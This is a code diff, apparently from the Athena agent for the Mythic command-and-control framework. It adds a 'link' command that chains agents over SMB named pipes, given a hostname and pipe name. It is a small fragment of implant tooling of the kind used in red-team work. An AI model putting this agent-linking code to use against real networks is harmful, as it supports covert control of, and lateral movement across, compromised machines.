@@ -144,6 +144,34 @@ namespace Athena.Commands
                         }
                     }, job.cancellationtokensource.Token);
                     break;
+                case "link":
+                    {
+                        Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
+                        if(par.ContainsKey("hostname") && par.ContainsKey("pipename"))
+                        {
+                            if(Globals.mc.MythicConfig.smbConfig.Link(par["hostname"], par["pipename"]))
+                            {
+                                completeJob(ref job, "Link established.", false);
+                            }
+                            else
+                            {
+                                if (Globals.mc.MythicConfig.smbConfig.connected)
+                                {
+                                    completeJob(ref job, "A connection has already been established with an Athena agent.", true);
+                                }
+                                else
+                                {
+                                    completeJob(ref job, "An error occured while establishing a link :(", true);
+                                }
+                            }
+                        }
+                        else
+                        {
+                            completeJob(ref job, "Invalid command line parameters.", true);
+                        }
+                        
+                    }
+                    break;
                 case "load":
                     Task.Run(() =>
                     {
